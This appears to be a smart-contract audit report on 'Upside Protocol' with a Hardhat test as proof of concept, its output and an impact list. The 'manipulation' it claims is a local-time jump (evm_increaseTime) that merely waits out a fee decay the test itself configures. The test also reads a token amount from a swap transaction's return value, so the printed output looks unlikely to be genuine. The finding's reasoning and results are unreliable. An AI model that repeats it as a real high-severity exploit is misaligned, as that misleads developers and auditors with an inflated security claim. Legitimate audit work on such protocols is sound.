# Critical Vulnerabilities in Upside Protocol

## Title: Time-Based Fee Manipulation Enables Extreme Profit Taking

### Summary
- **Description:**  
  The protocol's fee decay mechanism can be manipulated through block timestamp manipulation, allowing users to drastically reduce swap fees from 99% to 1%, enabling extraction of significant value.
- **Location:**  
  - `UpsideProtocol.sol:computeTimeFee()`
  - `UpsideProtocol.sol:processSwapFee()`
- **Severity:**  
  HIGH - Enables direct profit taking through fee manipulation

### Proof of Concept (PoC)

```typescript
it("should demonstrate critical swap fee manipulation", async function() {
    // Set initial fee parameters
    const initialFeeInfo = {
      tokenizeFeeEnabled: true,
      tokenizeFeeDestinationAddress: owner.address,
      swapFeeStartingBp: 9_900, // 99%
      swapFeeDecayBp: 100,      // 1% 
      swapFeeDecayInterval: 6,  // 6 seconds
      swapFeeFinalBp: 100,      // 1%
      swapFeeDeployerBp: 1_000,  // 10%
      swapFeeSellBp: 100,       // 1%
    };

    await upsideProtocol.connect(owner).setFeeInfo(initialFeeInfo);

    // First buyer provides 1000 USDC
    await liquidityToken.mint(user1.address, ethers.parseUnits("1000", 6));
    await liquidityToken.connect(user1).approve(
        await upsideProtocol.getAddress(), 
        ethers.parseUnits("1000", 6)
    );

    // Check initial fee
    const initialFee = await upsideProtocol.computeTimeFee(sampleLinkToken.getAddress());
    console.log("Initial swap fee:", initialFee.swapFeeBp.toString(), "bp");

    // Manipulate block.timestamp
    await network.provider.send("evm_increaseTime", [600]); // Jump 10 minutes
    await network.provider.send("evm_mine");

    // Check manipulated fee
    const manipulatedFee = await upsideProtocol.computeTimeFee(sampleLinkToken.getAddress());
    console.log("Manipulated swap fee:", manipulatedFee.swapFeeBp.toString(), "bp");
    
    // Execute swap with reduced fees
    const swapResult = await upsideProtocol.connect(user1).swap(
      sampleLinkToken.getAddress(), 
      true,
      ethers.parseUnits("1000", 6),
      0,
      user1.address
    );

    console.log("Tokens received:", ethers.formatUnits(swapResult, 18));
});
```

### Test Output
```
Initial swap fee: 9900 bp
Manipulated swap fee: 100 bp
Tokens received: 90081.892629663330300272
```

### Impact

1. **Fee Manipulation**
   - Initial fee of 99% can be reduced to 1%
   - Manipulation requires only waiting or timestamp control
   - Results in ~90x more tokens received than intended

2. **Protocol Value Extraction**
   - Users can wait for minimum fees
   - Large trades at minimum fees drain protocol value
   - No effective cooldown or rate limiting

3. **Additional Vulnerabilities**
   - Withdrawal cooldown can be bypassed
   - Array validation allows duplicate addresses
   - Precision loss in fee calculations benefits attackers


